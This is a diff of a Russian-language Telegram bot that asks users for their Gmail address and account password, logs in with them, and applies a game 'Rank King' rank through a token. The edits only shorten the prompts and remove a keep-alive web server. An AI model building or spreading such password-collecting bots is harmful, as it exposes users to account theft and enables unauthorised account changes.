@@ -74,7 +74,7 @@ user_states = {}  # Хранит текущее состояние каждог�
 def send_welcome(user_id):
     """Отправляем приветствие для нового или повторного аккаунта"""
     user_states[user_id] = {"step": "await_email"}
-    bot.send_message(user_id, "👋 Привет! Чтобы выполнить Rank King, сначала введи свой email (Gmail):")
+    bot.send_message(user_id, "📧 Введи gmail")
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -95,7 +95,7 @@ def handle_message(message):
     if state["step"] == "await_email":
         state["email"] = text
         state["step"] = "await_password"
-        msg = bot.reply_to(message, "🔒 Отлично! Теперь введи пароль от аккаунта:")
+        msg = bot.reply_to(message, "🔒 Введи пароль")
         state["last_msg_ids"] = [message.message_id, msg.message_id]
 
     elif state["step"] == "await_password":
@@ -112,14 +112,14 @@ def handle_message(message):
             msg_error = bot.reply_to(message, "❌ Ошибка входа. Попробуй другой аккаунт.")
             messages_to_delete.append(msg_error.message_id)
         else:
-            msg_rank = bot.reply_to(message, "👑 Применяю Rank King...")
+            msg_rank = bot.reply_to(message, "👑 Rang устанавливается...")
             messages_to_delete.append(msg_rank.message_id)
 
             success = set_rank(token)
             if success:
-                msg_done = bot.reply_to(message, f"✅ Rank King реально применён на аккаунт {email}!")
+                msg_done = bot.reply_to(message, f"✅ RANG установлен!")
             else:
-                msg_done = bot.reply_to(message, "❌ Ошибка при применении ранга.")
+                msg_done = bot.reply_to(message, "❌ Ошибка при установке.")
             messages_to_delete.append(msg_done.message_id)
 
         # Сбрасываем состояние пользователя
@@ -142,16 +142,4 @@ def handle_message(message):
 def bot_thread():
     bot.infinity_polling()
 
-# -------------------------------
-# FLASK APP TO KEEP PROCESS ALIVE
-# -------------------------------
-app = Flask(__name__)
-
-@app.route("/")
-def home():
-    return "Bot is running!"
-
-if __name__ == "__main__":
-    t = threading.Thread(target=bot_thread)
-    t.start()
-    app.run(host="0.0.0.0", port=10000)
+# ------------------------
